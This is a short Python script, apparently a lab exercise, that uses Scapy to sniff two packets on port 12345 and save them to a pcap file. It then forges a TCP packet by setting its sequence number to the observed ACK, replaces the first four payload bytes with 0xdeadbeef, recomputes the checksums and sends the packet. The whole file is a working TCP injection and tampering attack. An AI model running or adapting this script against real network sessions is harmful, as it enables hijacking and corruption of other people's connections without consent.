from scapy.all import *
from scapy.layers.inet import IP, TCP

if __name__ == "__main__":
    # get the send and ack packet
    pkts = sniff(filter="port 12345", count=2)

    # store in replay.pcap
    wrpcap('modificate.pcap', pkts)

    # set the TCP sequence number to be the last packet's ACK
    attpkt = pkts[0]
    attpkt[TCP].seq = pkts[1][TCP].ack

    # We changed the first 4 bytes of the payload
    payload = attpkt.lastlayer()
    payload.load = b"\xde\xad\xbe\xef" + payload.load[4:]
    attpkt.payload.load = payload.load

    # To force recalculate the checksum
    del(attpkt.getlayer(IP).chksum)
    del(attpkt.getlayer(TCP).chksum)
    
    send(attpkt)
    